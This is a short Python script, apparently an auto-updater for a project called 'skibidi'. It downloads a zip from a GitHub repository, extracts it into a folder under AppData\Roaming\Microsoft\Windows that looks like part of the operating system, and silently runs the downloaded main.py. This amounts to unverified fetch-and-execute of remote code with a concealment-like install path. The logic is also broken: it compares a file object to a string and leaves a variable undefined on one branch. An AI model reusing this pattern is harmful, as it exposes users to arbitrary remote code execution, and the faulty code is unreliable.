import requests
import zipfile
import os
import shutil
import subprocess

user_profile = os.environ['USERPROFILE']
with open(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'skibidi-mainmain', 'ver.txt'), 'r') as ver:
    r = requests.get("https://raw.githubusercontent.com/noel-create/skibidi/refs/heads/main/ver.txt")
    ver1 = r.text
    print(ver)
    print(ver1)
    if ver == ver1:
        pass
    else:
        shutil.rmtree(os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows', 'skibidi-mainmain'))
        target_path = os.path.join(user_profile, 'AppData', 'Roaming', 'Microsoft', 'Windows')
        r = requests.get("https://github.com/noel-create/skibidi/archive/refs/heads/mainmain.zip", allow_redirects=True)
        file_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'skibidi-mainmain.zip')
        open(file_path, 'wb').write(r.content)
        with zipfile.ZipFile(file_path, 'r') as zip_ref:
            zip_ref.extractall(target_path)
        os.remove(file_path)

subprocess.Popen(['python', os.path.join(target_path, "skibidi-mainmain", "main.py")])

